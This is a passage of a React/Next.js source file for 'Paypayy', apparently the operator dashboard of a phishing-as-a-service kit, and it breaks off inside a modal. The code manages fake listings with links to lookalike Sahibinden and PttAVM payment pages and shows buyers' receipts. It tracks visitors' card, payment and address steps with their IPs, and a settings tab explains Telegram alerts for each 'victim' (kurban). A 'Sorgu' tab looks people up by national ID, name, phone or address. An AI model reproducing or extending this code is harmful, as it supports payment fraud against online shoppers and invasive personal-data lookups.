'use client';

import { useState, useEffect, useRef } from 'react';
import { useRouter } from 'next/navigation';
import { JakartaSans } from '@/lib/fonts';

export default function MusteriPanel() {
    const router = useRouter();
    const [user, setUser] = useState<any>(null);
    const [loading, setLoading] = useState(true);
    const [activeTab, setActiveTab] = useState('ilanlar');
    const [theme, setTheme] = useState('dark');
    const [searchTerm, setSearchTerm] = useState('');
    
    // Stats
    const [stats, setStats] = useState({ ilan: 0, dekont: 0, log: 0 });
    
    // Data
    const [ilanlar, setIlanlar] = useState<any[]>([]);
    const [dekontlar, setDekontlar] = useState<any[]>([]);
    const [logs, setLogs] = useState<any[]>([]);
    const [tickets, setTickets] = useState<any[]>([]);
    const [systemStatus, setSystemStatus] = useState<any>({ kilitDurumu: false, sorguAktif: true, anonsMesaji: '' });
    
    // UI States
    const [toasts, setToasts] = useState<any[]>([]);
    const [isIlanModalOpen, setIsIlanModalOpen] = useState(false);
    const [isBulkModalOpen, setIsBulkModalOpen] = useState(false);
    const [isTicketModalOpen, setIsTicketModalOpen] = useState(false);
    const [isTicketReadModalOpen, setIsTicketReadModalOpen] = useState(false);
    const [isKanbanOpen, setIsKanbanOpen] = useState(false);
    const [isConfirmModalOpen, setIsConfirmModalOpen] = useState(false);
    const [confirmConfig, setConfirmConfig] = useState({ message: '', onConfirm: () => {} });
    
    // Forms
    const [ilanForm, setIlanForm] = useState<any>({
        docId: '', urunAdi: '', saticiAdi: '', saticiTel: '', sehir: '',
        kategoriAgaci: '', fiyat: '', hesapTarihi: '', iban: '',
        odemeYontemi: 'Havale / EFT', urunAciklamasi: '',
        dinamikOzellikler: [], resimler: [], anaResim: '', linkUzantisi: ''
    });
    const [bulkForm, setBulkForm] = useState({ saticiAdi: '', saticiTel: '', iban: '' });
    const [ticketForm, setTicketForm] = useState({ konu: 'Sistem Hatası / Bug', mesaj: '' });
    const [viewingTicket, setViewingTicket] = useState<any>(null);
    const [selectedAdIds, setSelectedAdIds] = useState<string[]>([]);
    const [logFilter, setLogFilter] = useState('all');

    // Sorgu States
    const [sorguTuru, setSorguTuru] = useState('tc');
    const [sorguDeğerleri, setSorguDeğerleri] = useState<any>({ tc: '', ad: '', soyad: '', telefon: '', adres: '' });
    const [sorguSonuclari, setSorguSonuclari] = useState<any[]>([]);
    const [isSorguLoading, setIsSorguLoading] = useState(false);

    const [tgSettings, setTgSettings] = useState({ botToken: '', chatId: '' });

    // Helpers
    const slugify = (text: string) => {
        const trMap: any = { 'ç':'c', 'Ç':'c', 'ğ':'g', 'Ğ':'g', 'ş':'s', 'Ş':'s', 'ü':'u', 'Ü':'u', 'ı':'i', 'İ':'i', 'ö':'o', 'Ö':'o' };
        let str = text;
        for(let key in trMap) str = str.replace(new RegExp(key, 'g'), trMap[key]);
        return str.toLowerCase().replace(/[^-a-zA-Z0-9\s]+/ig, '').replace(/\s/gi, "-").replace(/-+/g, "-");
    };

    const showToast = (message: string, type: 'success' | 'error' | 'info' = 'success', title?: string) => {
        const id = Math.random().toString(36).substr(2, 9);
        const newToast = { id, message, type, title: title || (type === 'success' ? 'BAŞARILI' : type === 'error' ? 'HATA' : 'BİLGİ') };
        setToasts(prev => [...prev, newToast]);
        setTimeout(() => setToasts(prev => prev.filter(t => t.id !== id)), 3500);
    };

    const checkTokenError = (res: Response) => {
        if (res.status === 401 || res.status === 403) {
            localStorage.clear();
            router.push('/login');
            return true;
        }
        return false;
    };

    const loadData = async (silent = false) => {
        try {
            // User & System Status
            const [uRes, sRes] = await Promise.all([
                fetch('/api/profilim'),
                fetch('/api/sistem/durum')
            ]);
            
            if (checkTokenError(uRes)) return;
            const userData = await uRes.json();
            setUser(userData);
            if (!silent) setTgSettings({ botToken: userData.tgBotToken || '', chatId: userData.tgChatId || '' });

            if (sRes.ok) setSystemStatus(await sRes.json());

            // Main Data
            const [iRes, dRes, lRes, tRes] = await Promise.all([
                fetch(`/api/ilanlar-getir?userId=${userData.id}`),
                fetch(`/api/dekontlar-getir?userId=${userData.id}`),
                fetch(`/api/logs-getir?userId=${userData.id}`),
                fetch('/api/tickets')
            ]);

            if (iRes.ok) {
                const iData = await iRes.json();
                setIlanlar(iData);
                setStats(prev => ({ ...prev, ilan: iData.length }));
            }
            if (dRes.ok) {
                const dData = await dRes.json();
                setDekontlar(dData);
                setStats(prev => ({ ...prev, dekont: dData.length }));
            }
            if (lRes.ok) {
                const lData = await lRes.json();
                setLogs(lData.sort((a: any, b: any) => b.timestamp - a.timestamp));
                setStats(prev => ({ ...prev, log: lData.length }));
            }
            if (tRes.ok) setTickets(await tRes.json());

            setLoading(false);
        } catch (err) {
            console.error(err);
            if (!silent) setLoading(false);
        }
    };

    useEffect(() => {
        loadData();
        const interval = setInterval(() => loadData(true), 15000);
        return () => clearInterval(interval);
    }, []);

    // Handlers
    const handleLogout = async () => {
        await fetch('/api/logout', { method: 'POST' });
        localStorage.clear();
        router.push('/login');
    };
    const toggleTheme = () => {
        const newTheme = theme === 'light' ? 'dark' : 'light';
        setTheme(newTheme);
        document.documentElement.setAttribute('data-theme', newTheme);
    };

    const handleCopy = (url: string, platform: string) => {
        navigator.clipboard.writeText(url);
        showToast(`${platform} linki kopyalandı!`, 'success');
    };

    const handleDeleteIlan = (id: string) => {
        setConfirmConfig({
            message: "Bu ilanı sistemden tamamen silmek üzeresiniz. Onaylıyor musunuz?",
            onConfirm: async () => {
                const res = await fetch(`/api/ilan-sil/${id}`, { 
                    method: 'DELETE'
                });
                if (checkTokenError(res)) return;
                showToast("İlan silindi.", "success");
                loadData(true);
            }
        });
        setIsConfirmModalOpen(true);
    };

    const handleToggleIlan = async (id: string, currentStatus: string) => {
        const newStatus = currentStatus === 'aktif' ? 'pasif' : 'aktif';
        const res = await fetch(`/api/ilan-guncelle/${id}`, {
            method: 'PATCH',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ durum: newStatus })
        });
        if (checkTokenError(res)) return;
        showToast(`İlan ${newStatus === 'aktif' ? 'yayına alındı' : 'pasife çekildi'}.`, 'info');
        loadData(true);
    };

    const handleCloneIlan = async (id: string) => {
        const ilan = ilanlar.find(i => i.docId === id);
        if (!ilan) return;
        
        if (user?.ilanKotasi !== 'sinirsiz' && ilanlar.length >= parseInt(user?.ilanKotasi)) {
            return showToast("Paket limitinize ulaştınız!", "error", "KOTA DOLDU");
        }

        const clone = { ...ilan };
        delete clone.docId;
        clone.urunAdi = ilan.urunAdi + " (Kopya)";
        clone.linkUzantisi = slugify(clone.urunAdi) + "-" + Math.floor(Math.random() * 1000);
        clone.durum = "pasif";

        const res = await fetch(`/api/ilan-ekle`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(clone)
        });
        if (checkTokenError(res)) return;
        showToast("İlan klonlandı!");
        loadData(true);
    };

    const handleBulkUpdate = async () => {
        if (selectedAdIds.length === 0) return showToast("Lütfen ilan seçin.", 'error');
        const payload: any = {};
        if (bulkForm.saticiAdi) payload.saticiAdi = bulkForm.saticiAdi;
        if (bulkForm.saticiTel) payload.saticiTel = bulkForm.saticiTel;
        if (bulkForm.iban) payload.iban = bulkForm.iban;

        if (Object.keys(payload).length === 0) return showToast("En az bir alan doldurun.", 'error');

        showToast(`${selectedAdIds.length} ilan güncelleniyor...`, 'info');
        await Promise.all(selectedAdIds.map(id => fetch(`/api/ilan-guncelle/${id}`, {
            method: 'PATCH',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        })));
        
        showToast("Toplu güncelleme başarılı!");
        setIsBulkModalOpen(false);
        setSelectedAdIds([]);
        loadData(true);
    };

    const handleIlanSubmit = async (e: any) => {
        e.preventDefault();
        const btn = e.target.querySelector('button[type="submit"]');
        btn.disabled = true;
        const originalText = btn.innerText;
        btn.innerText = "Kaydediliyor...";

        const isEditing = !!ilanForm.docId;
        const method = isEditing ? 'PATCH' : 'POST';
        const url = isEditing ? `/api/ilan-guncelle/${ilanForm.docId}` : '/api/ilan-ekle';

        const payload = { ...ilanForm, olusturanMusteri: user.id };
        if (!isEditing) payload.durum = 'aktif';

        const res = await fetch(url, {
            method,
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        if (checkTokenError(res)) return;
        if (res.ok) {
            showToast(isEditing ? "Güncellendi." : "İlan oluşturuldu.");
            setIsIlanModalOpen(false);
            loadData(true);
        } else {
            const err = await res.json();
            showToast(err.message || "Bir hata oluştu.", "error");
        }
        btn.disabled = false;
        btn.innerText = originalText;
    };

    const handleTicketSubmit = async () => {
        if (!ticketForm.mesaj) return showToast("Lütfen mesaj yazın.", 'error');
        const res = await fetch('/api/tickets', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ ...ticketForm, musteriId: user.id, musteriIsim: user.isim, tarih: Date.now(), durum: 'Acik' })
        });
        if (checkTokenError(res)) return;
        showToast("Destek talebi iletildi.");
        setTicketForm({ konu: 'Sistem Hatası / Bug', mesaj: '' });
        loadData(true);
    };

    const handleSaveAyarlar = async () => {
        const res = await fetch(`/api/users/guncelle/${user.id}`, {
            method: 'PATCH',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ tgBotToken: tgSettings.botToken, tgChatId: tgSettings.chatId })
        });
        if (checkTokenError(res)) return;
        showToast("Ayarlar kaydedildi.");
        loadData(true);
    };

    const handleSorgu = async () => {
        if (!systemStatus.sorguAktif) return showToast("Sorgu sistemi şu an kapalı.", "error");
        setIsSorguLoading(true);
        // Mocking sorgu for now as it's typically an external API call
        setTimeout(() => {
            setSorguSonuclari([
                { tc: '12345678901', adSoyad: 'Test Kullanıcı', telefon: '05555555555', adres: 'İstanbul, Türkiye' }
            ]);
            setIsSorguLoading(false);
        }, 1500);
    };

    // Kanban Logic
    const getKanbanData = () => {
        const now = Date.now();
        const groups: any = { visit: [], payment: [], address: [], success: [] };
        const uniqueIps = new Set();
        
        logs.forEach(log => {
            if (uniqueIps.has(log.ip)) return;
            uniqueIps.add(log.ip);

            const act = (log.aksiyon || "").toLowerCase();
            let cat = 'visit';
            if (act.includes("başarılı") || act.includes("dekont")) cat = 'success';
            else if (act.includes("adres")) cat = 'address';
            else if (act.includes("ödeme") || act.includes("satın") || act.includes("kart")) cat = 'payment';

            groups[cat].push({ ...log, isIdle: (now - log.timestamp) > 180000 });
        });
        return groups;
    };

    if (loading) return (
        <div className="loading-screen">
            <div className="spinner"></div>
            <p>Paypayy Dashboard Hazırlanıyor...</p>
        </div>
    );

    const kanban = getKanbanData();

    return (
        <div className={`panel-container ${JakartaSans.className}`}>
            {/* Lockdown Overlay */}
            {systemStatus.kilitDurumu && (
                <div className="lockdown-overlay active">
                    <div className="lockdown-card">
                        <svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="#ef4444" strokeWidth="1.5"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                        <h2>SİSTEM KİLİTLENDİ</h2>
                        <p>Yönetici tarafından geçici bir bakım çalışması yürütülüyor. Lütfen daha sonra tekrar deneyin.</p>
                    </div>
                </div>
            )}

            {/* Soft-Ban Banner */}
            {user?.isSoftBanned && (
                <div className="soft-ban-banner">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
                    <span><strong>HESAP KISITLANDI:</strong> Paket süreniz dolmuş veya ödeme bekleniyor. Bazı özellikler devre dışıdır.</span>
                </div>
            )}

            {/* Anons Banner */}
            {systemStatus.anonsMesaji && (
                <div className="anons-banner">
                    <div className="anons-badge">ANONS</div>
                    <marquee>{systemStatus.anonsMesaji}</marquee>
                </div>
            )}

            {/* Header */}
            <header className="panel-header">
                <div className="logo-section">
                    <div className="logo-icon">P</div>
                    <div>
                        <h1>Paypayy</h1>
                        <p>Müşteri Paneli / {user?.isim}</p>
                    </div>
                </div>
                <div className="header-actions">
                    <button className="theme-toggle-btn" onClick={toggleTheme}>
                        {theme === 'dark' ? '☀️' : '🌙'}
                    </button>
                    <button className="logout-btn" onClick={handleLogout}>
                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>
                        Çıkış
                    </button>
                </div>
            </header>

            {/* Stats HUD */}
            <div className="stats-hud">
                <div className="stat-card" onClick={() => setActiveTab('ilanlar')}>
                    <div className="stat-icon" style={{ background: 'rgba(59, 130, 246, 0.1)', color: '#3b82f6' }}>
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
                    </div>
                    <div className="stat-info">
                        <span className="stat-label">Aktif İlan</span>
                        <span className="stat-value">{stats.ilan}</span>
                    </div>
                </div>
                <div className="stat-card" onClick={() => setActiveTab('dekontlar')}>
                    <div className="stat-icon" style={{ background: 'rgba(16, 185, 129, 0.1)', color: '#10b981' }}>
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="2" y="5" width="20" height="14" rx="2"/><line x1="2" y1="10" x2="22" y2="10"/></svg>
                    </div>
                    <div className="stat-info">
                        <span className="stat-label">Dekontlarım</span>
                        <span className="stat-value">{user?.isSoftBanned ? '🔒' : stats.dekont}</span>
                    </div>
                </div>
                <div className="stat-card" onClick={() => setActiveTab('loglar')}>
                    <div className="stat-icon" style={{ background: 'rgba(245, 158, 11, 0.1)', color: '#f59e0b' }}>
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>
                    </div>
                    <div className="stat-info">
                        <span className="stat-label">Sistem Logları</span>
                        <span className="stat-value">{user?.isSoftBanned ? '🔒' : stats.log}</span>
                    </div>
                </div>
            </div>

            {/* Main Content */}
            <div className="main-content">
                <div className="search-bar">
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="var(--text-muted)" strokeWidth="2.5"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
                    <input 
                        type="text" 
                        placeholder="İlan adı, satıcı, aksiyon veya IP ile filtrele..." 
                        value={searchTerm} 
                        onChange={(e) => setSearchTerm(e.target.value)} 
                    />
                </div>

                <div className="tab-nav">
                    {['ilanlar', 'dekontlar', 'loglar', 'sorgu', 'destek', 'ayarlar'].map(tab => (
                        <button 
                            key={tab} 
                            className={`tab-btn ${activeTab === tab ? 'active' : ''}`}
                            onClick={() => setActiveTab(tab)}
                        >
                            {tab === 'ilanlar' ? 'İlanlarım' : tab === 'dekontlar' ? 'Dekontlarım' : tab === 'loglar' ? 'Sistem Logları' : tab === 'sorgu' ? 'Sorgu Paneli' : tab === 'destek' ? 'Destek Talepleri' : 'Ayarlar'}
                        </button>
                    ))}
                </div>

                <div className="tab-content-area">
                    {activeTab === 'ilanlar' && (
                        <div className="view-container">
                            <div className="view-actions">
                                {!user?.isSoftBanned && (
                                    <>
                                        <button className="btn-primary" onClick={() => {
                                            setIlanForm({ docId: '', urunAdi: '', saticiAdi: '', saticiTel: '', sehir: '', kategoriAgaci: '', fiyat: '', hesapTarihi: '', iban: '', odemeYontemi: 'Havale / EFT', urunAciklamasi: '', dinamikOzellikler: [], resimler: [], anaResim: '', linkUzantisi: '' });
                                            setIsIlanModalOpen(true);
                                        }}>
                                            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
                                            Yeni İlan Oluştur
                                        </button>
                                        <button className={`btn-outline ${selectedAdIds.length > 0 ? 'active' : ''}`} onClick={() => setIsBulkModalOpen(true)}>
                                            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>
                                            Toplu İşlemler ({selectedAdIds.length})
                                        </button>
                                    </>
                                )}
                            </div>
                            <div className="table-wrapper">
                                <table>
                                    <thead>
                                        <tr>
                                            <th><input type="checkbox" onChange={(e) => setSelectedAdIds(e.target.checked ? ilanlar.map(i => i.docId) : [])} /></th>
                                            <th>Görsel</th>
                                            <th>Linkler</th>
                                            <th>İlan Başlığı</th>
                                            <th>Satıcı</th>
                                            <th>Fiyat</th>
                                            <th>Durum</th>
                                            <th>İşlem</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        {ilanlar.filter(i => i.urunAdi.toLowerCase().includes(searchTerm.toLowerCase())).map(ilan => (
                                            <tr key={ilan.docId}>
                                                <td><input type="checkbox" checked={selectedAdIds.includes(ilan.docId)} onChange={(e) => setSelectedAdIds(prev => e.target.checked ? [...prev, ilan.docId] : prev.filter(id => id !== ilan.docId))} /></td>
                                                <td><img src={ilan.anaResim} alt="" className="thumb-img" /></td>
                                                <td>
                                                    {!user?.isSoftBanned ? (
                                                        <div className="link-group">
                                                            <button className="link-badge sahibinden" onClick={() => handleCopy(`https://payislemleri-sahibinden.vercel.app/${ilan.linkUzantisi || ilan.docId}`, 'Sahibinden')}>SHB</button>
                                                            <button className="link-badge ptt" onClick={() => handleCopy(`https://payislemlerim-pttavm.vercel.app/${ilan.linkUzantisi || ilan.docId}`, 'PttAVM')}>PTT</button>
                                                        </div>
                                                    ) : <span className="locked-badge">🔒 Kilitli</span>}
                                                </td>
                                                <td><div className="title-cell"><strong>{ilan.urunAdi}</strong><small>{ilan.linkUzantisi || ilan.docId}</small></div></td>
                                                <td>{ilan.saticiAdi}</td>
                                                <td>{ilan.fiyat} TL</td>
                                                <td>
                                                    <label className="switch">
                                                        <input type="checkbox" checked={ilan.durum === 'aktif'} onChange={() => handleToggleIlan(ilan.docId, ilan.durum)} disabled={user?.isSoftBanned} />
                                                        <span className="slider"></span>
                                                    </label>
                                                </td>
                                                <td>
                                                    {!user?.isSoftBanned && (
                                                        <div className="row-actions">
                                                            <button className="icon-btn" onClick={() => { setIlanForm(ilan); setIsIlanModalOpen(true); }} title="Düzenle">✏️</button>
                                                            <button className="icon-btn" onClick={() => handleCloneIlan(ilan.docId)} title="Klonla">📋</button>
                                                            <button className="icon-btn danger" onClick={() => handleDeleteIlan(ilan.docId)} title="Sil">🗑️</button>
                                                        </div>
                                                    )}
                                                </td>
                                            </tr>
                                        ))}
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    )}

                    {activeTab === 'dekontlar' && (
                        <div className="view-container">
                            {user?.isSoftBanned ? (
                                <div className="empty-state kilitli">
                                    <svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                                    <h3>Erişim Kısıtlandı</h3>
                                    <p>Dekontlarınızı görebilmek için ödemenizi yapmalısınız.</p>
                                </div>
                            ) : (
                                <div className="table-wrapper">
                                    <table>
                                        <thead>
                                            <tr>
                                                <th>Tarih / Saat</th>
                                                <th>İlan Başlığı</th>
                                                <th>Alıcı Adı</th>
                                                <th>Alıcı Telefon</th>
                                                <th>İşlem</th>
                                            </tr>
                                        </thead>
                                        <tbody>
                                            {dekontlar.filter(d => d.ilanBasligi.toLowerCase().includes(searchTerm.toLowerCase()) || d.aliciAd.toLowerCase().includes(searchTerm.toLowerCase())).map(dekont => (
                                                <tr key={dekont.id}>
                                                    <td>{dekont.tarih} - {dekont.saat}</td>
                                                    <td><strong>{dekont.ilanBasligi}</strong></td>
                                                    <td>{dekont.aliciAd}</td>
                                                    <td>{dekont.aliciTel}</td>
                                                    <td>
                                                        <button className="btn-view" onClick={() => window.open(dekont.dekontUrl, '_blank')}>Görüntüle</button>
                                                    </td>
                                                </tr>
                                            ))}
                                        </tbody>
                                    </table>
                                </div>
                            )}
                        </div>
                    )}

                    {activeTab === 'loglar' && (
                        <div className="view-container">
                            {user?.isSoftBanned ? (
                                <div className="empty-state kilitli">
                                    <svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                                    <h3>Erişim Kısıtlandı</h3>
                                    <p>Sistem loglarını görebilmek için ödemenizi yapmalısınız.</p>
                                </div>
                            ) : (
                                <>
                                    <div className="log-header">
                                        <div className="log-filters">
                                            {['all', 'visit', 'payment', 'address', 'success', 'error'].map(f => (
                                                <button key={f} className={`filter-btn ${logFilter === f ? 'active' : ''}`} onClick={() => setLogFilter(f)}>
                                                    {f === 'all' ? 'Tümü' : f === 'visit' ? 'Ziyaret' : f === 'payment' ? 'Ödeme' : f === 'address' ? 'Adres' : f === 'success' ? 'Başarılı' : 'Hatalar'}
                                                </button>
                                            ))}
                                        </div>
                                        <button className="btn-kanban" onClick={() => setIsKanbanOpen(true)}>
                                            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><line x1="9" y1="3" x2="9" y2="21"/><line x1="15" y1="3" x2="15" y2="21"/></svg>
                                            Canlı Pano
                                        </button>
                                    </div>
                                    <div className="table-wrapper">
                                        <table className="log-table">
                                            <thead>
                                                <tr>
                                                    <th>Tarih / Saat</th>
                                                    <th>İlan Bilgisi</th>
                                                    <th>Aksiyon</th>
                                                    <th>Detay</th>
                                                    <th>IP / Cihaz</th>
                                                </tr>
                                            </thead>
                                            <tbody>
                                                {logs.filter(l => {
                                                    if (logFilter === 'all') return true;
                                                    const act = l.aksiyon.toLowerCase();
                                                    if (logFilter === 'visit') return act.includes('ziyaret') || act.includes('vitrin');
                                                    if (logFilter === 'payment') return act.includes('ödeme') || act.includes('kart');
                                                    if (logFilter === 'address') return act.includes('adres');
                                                    if (logFilter === 'success') return act.includes('başarılı') || act.includes('dekont');
                                                    if (logFilter === 'error') return act.includes('hata');
                                                    return true;
                                                }).filter(l => l.ilanBasligi?.toLowerCase().includes(searchTerm.toLowerCase()) || l.ip?.includes(searchTerm)).map(log => (
                                                    <tr key={log.id}>
                                                        <td><div className="date-cell"><span>{log.tarih}</span><small>{log.saat}</small></div></td>
                                                        <td><div className="title-cell"><strong>{log.ilanBasligi}</strong><small>{log.saticiAdi}</small></div></td>
                                                        <td><span className={`log-badge ${log.aksiyon.toLowerCase().includes('başarılı') ? 'success' : log.aksiyon.toLowerCase().includes('hata') ? 'danger' : 'info'}`}>{log.aksiyon}</span></td>
                                                        <td className="detail-cell">{log.detay || '-'}</td>
                                                        <td><div className="ip-cell"><code>{log.ip}</code><small>{log.cihaz || log.os}</small></div></td>
                                                    </tr>
                                                ))}
                                            </tbody>
                                        </table>
                                    </div>
                                </>
                            )}
                        </div>
                    )}

                    {activeTab === 'sorgu' && (
                        <div className="view-container">
                            <div className="sorgu-hero">
                                <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#8b5cf6" strokeWidth="2"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
                                <h2>Sorgu Paneli</h2>
                                <p>TC Kimlik, Ad Soyad veya Telefon ile detaylı sorgulama yapın.</p>
                            </div>

                            {!systemStatus.sorguAktif && (
                                <div className="sorgu-bakim">Sorgu sistemi şu an bakımda veya geçici olarak devre dışıdır.</div>
                            )}

                            <div className={`sorgu-form ${!systemStatus.sorguAktif ? 'disabled' : ''}`}>
                                <div className="form-grid">
                                    <div className="form-group">
                                        <label>Sorgu Türü</label>
                                        <select value={sorguTuru} onChange={(e) => setSorguTuru(e.target.value)}>
                                            <option value="tc">TC Kimlik No</option>
                                            <option value="adsoyad">Ad Soyad</option>
                                            <option value="telefon">Telefon No</option>
                                            <option value="adres">Adres</option>
                                        </select>
                                    </div>
                                    <div className="form-group flex-2">
                                        <label>Sorgu Değeri</label>
                                        {sorguTuru === 'adsoyad' ? (
                                            <div className="input-row">
                                                <input type="text" placeholder="Ad" value={sorguDeğerleri.ad} onChange={(e) => setSorguDeğerleri({ ...sorguDeğerleri, ad: e.target.value })} />
                                                <input type="text" placeholder="Soyad" value={sorguDeğerleri.soyad} onChange={(e) => setSorguDeğerleri({ ...sorguDeğerleri, soyad: e.target.value })} />
                                            </div>
                                        ) : (
                                            <input type="text" placeholder="Sorgulanacak bilgiyi girin..." value={sorguDeğerleri[sorguTuru]} onChange={(e) => setSorguDeğerleri({ ...sorguDeğerleri, [sorguTuru]: e.target.value })} />
                                        )}
                                    </div>
                                </div>
                                <button className="btn-primary" onClick={handleSorgu} disabled={isSorguLoading}>
                                    {isSorguLoading ? 'Sorgulanıyor...' : 'Sorgulamayı Başlat'}
                                </button>
                            </div>

                            <div className="table-wrapper" style={{ marginTop: '30px' }}>
                                <table>
                                    <thead>
                                        <tr>
                                            <th>TC Kimlik</th>
                                            <th>Ad Soyad</th>
                                            <th>Telefon</th>
                                            <th>Açık Adres</th>
                                            <th>İşlem</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        {sorguSonuclari.map((res, i) => (
                                            <tr key={i}>
                                                <td>{res.tc}</td>
                                                <td><strong>{res.adSoyad}</strong></td>
                                                <td>{res.telefon}</td>
                                                <td>{res.adres}</td>
                                                <td><button className="btn-view">Kopyala</button></td>
                                            </tr>
                                        ))}
                                        {sorguSonuclari.length === 0 && !isSorguLoading && (
                                            <tr><td colSpan={5} style={{ textAlign: 'center', padding: '40px', color: 'var(--text-muted)' }}>Henüz sorgu sonucu yok.</td></tr>
                                        )}
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    )}

                    {activeTab === 'destek' && (
                        <div className="view-container">
                            <div className="destek-split">
                                <div className="destek-form-area">
                                    <h3>Yeni Destek Talebi</h3>
                                    <div className="form-group">
                                        <label>Konu</label>
                                        <select value={ticketForm.konu} onChange={(e) => setTicketForm({ ...ticketForm, konu: e.target.value })}>
                                            <option value="Sistem Hatası / Bug">Sistem Hatası / Bug</option>
                                            <option value="İlan Sorunu">İlan Sorunu</option>
                                            <option value="Bakiye / Ödeme">Bakiye / Ödeme</option>
                                            <option value="Diğer">Diğer</option>
                                        </select>
                                    </div>
                                    <div className="form-group">
                                        <label>Mesajınız</label>
                                        <textarea rows={4} placeholder="Talebinizi buraya yazın..." value={ticketForm.mesaj} onChange={(e) => setTicketForm({ ...ticketForm, mesaj: e.target.value })}></textarea>
                                    </div>
                                    <button className="btn-primary" onClick={handleTicketSubmit} disabled={user?.isSoftBanned}>Talebi Gönder</button>
                                </div>
                                <div className="destek-history">
                                    <h3>Geçmiş Taleplerim</h3>
                                    <div className="ticket-list">
                                        {tickets.map(t => (
                                            <div key={t.docId} className="ticket-card" onClick={() => { setViewingTicket(t); setIsTicketReadModalOpen(true); }}>
                                                <div className="ticket-header">
                                                    <strong>{t.konu}</strong>
                                                    <span className={`ticket-badge ${t.durum}`}>{t.durum === 'Acik' ? 'Yanıt Bekliyor' : t.durum === 'Yanitlandi' ? 'Yanıtlandı' : 'Kapatıldı'}</span>
                                                </div>
                                                <p>{t.mesaj.substring(0, 60)}...</p>
                                                <small>{new Date(t.tarih).toLocaleString('tr-TR')}</small>
                                            </div>
                                        ))}
                                    </div>
                                </div>
                            </div>
                        </div>
                    )}

                    {activeTab === 'ayarlar' && (
                        <div className="view-container ayarlar-view">
                            <div className="ayarlar-header">
                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#3b82f6" strokeWidth="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
                                <h3>Telegram Bildirim Ayarları</h3>
                            </div>
                            <div className="ayarlar-info">
                                <p>Sisteme bir kurban girdiğinde, ödeme adımına geçtiğinde veya adres girdiğinde anlık bildirim almak için kendi Telegram botunuzu bağlayabilirsiniz.</p>
                                <div className="guide-box">
                                    <strong>Nasıl Yapılır?</strong>
                                    <ol>
                                        <li>@BotFather üzerinden /newbot yazarak bot oluşturun ve <b>Token</b> alın.</li>
                                        <li>@RawDataBot botuna bir mesaj atın ve <b>Chat ID</b> numaranızı öğrenin.</li>
                                        <li>Aşağıdaki kutulara kaydedin.</li>
                                    </ol>
                                </div>
                            </div>
                            <div className="form-grid">
                                <div className="form-group">
                                    <label>Bot Token</label>
                                    <input type="text" placeholder="123456:ABC-DEF..." value={tgSettings.botToken} onChange={(e) => setTgSettings({ ...tgSettings, botToken: e.target.value })} />
                                </div>
                                <div className="form-group">
                                    <label>Chat ID</label>
                                    <input type="text" placeholder="123456789" value={tgSettings.chatId} onChange={(e) => setTgSettings({ ...tgSettings, chatId: e.target.value })} />
                                </div>
                            </div>
                            <button className="btn-primary" onClick={handleSaveAyarlar}>Ayarları Kaydet</button>
                        </div>
                    )}
                </div>
            </div>

            {/* Modals */}
            {isIlanModalOpen && (
                <div className="modal-overlay" onClick={() => setIsIlanModalOpen(false)}>
                    <div className="modal-content" onClick={e => e.stopPropagation()}>
                        <div className="modal-header">
